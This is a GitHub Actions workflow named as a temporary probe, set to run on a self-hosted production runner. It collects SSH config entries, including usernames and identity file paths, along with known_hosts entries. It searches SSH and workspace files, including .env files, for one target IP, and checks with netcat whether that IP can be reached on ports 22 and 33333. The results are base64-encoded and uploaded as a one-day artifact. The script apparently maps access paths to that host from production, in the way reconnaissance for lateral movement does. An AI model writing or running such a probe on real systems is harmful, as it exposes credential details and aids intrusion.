name: zz-tmp-runner-probe
on:
  workflow_dispatch:
permissions:
  contents: read
jobs:
  probe:
    runs-on: [self-hosted, nba-production]
    timeout-minutes: 10
    steps:
      - name: collect
        shell: bash
        run: |
          set +e
          D="${RUNNER_TEMP:-/tmp}/zzprobe"
          mkdir -p "$D" 2>/dev/null
          S="$D/00_status.txt"; : > "$S" 2>/dev/null
          # (1) ssh metadata only
          {
            if [ -f "$HOME/.ssh/config" ]; then
              awk 'BEGIN{IGNORECASE=1} /^[[:space:]]*(Host|HostName|User|Port|IdentityFile)[[:space:]]/{print}' "$HOME/.ssh/config"
            else
              echo "no ~/.ssh/config"
            fi
          } > "$D/01_ssh_config.txt" 2>&1; echo "01 rc=$?" >> "$S"
          {
            for f in "$HOME/.ssh/known_hosts" "$HOME/.ssh/known_hosts2"; do
              [ -f "$f" ] || continue
              echo "## $f"
              awk '{print $1}' "$f" 2>/dev/null | sed 's/,.*//' | sed -E 's/^\|.*$/[HASHED]/' | sort -u | head -40
            done
          } > "$D/02_known_hosts.txt" 2>&1; echo "02 rc=$?" >> "$S"
          # (2) grep target IP in ~/.ssh and up to 3 explicit work paths
          {
            echo "## $HOME/.ssh"
            grep -rIl --binary-files=without-match -m 1 '13\.52\.111\.2' "$HOME/.ssh" 2>/dev/null | head -20
            for p in "${GITHUB_WORKSPACE:-}" "${RUNNER_WORKSPACE:-}"; do
              [ -n "$p" ] || continue
              [ -d "$p" ] || continue
              echo "## $p"
              find "$p" -maxdepth 6 -type f -size -3M \( -name '*.yml' -o -name '*.yaml' -o -name '*.json' -o -name '*.sh' -o -name '*.env' -o -name '*.env.*' -o -name '*.conf' -o -name '*.cfg' -o -name '*.ini' -o -name '*.md' -o -name '*.txt' \) -print0 2>/dev/null | head -z -c 600000 | xargs -0 grep -Il -m 1 '13\.52\.111\.2' 2>/dev/null | head -30
            done
          } > "$D/03_grep_hits.txt" 2>&1; echo "03 rc=$?" >> "$S"
          # (3) reachability only
          {
            for p in 22 33333; do
              echo "== nc 13.52.111.2 $p =="
              nc -vz -w 5 13.52.111.2 $p 2>&1
              echo "rc=$?"
            done
          } > "$D/04_reach.txt" 2>&1; echo "04 rc=$?" >> "$S"
          cd "$D" || exit 0
          for f in *.txt; do base64 < "$f" > "$f.b64" 2>/dev/null; done
          wc -c "$D"/*.txt 2>/dev/null | tail -10
          cat "$S"
      - uses: actions/upload-artifact@v4
        with:
          name: zz-probe-out
          path: ${{ runner.temp }}/zzprobe
          retention-days: 1
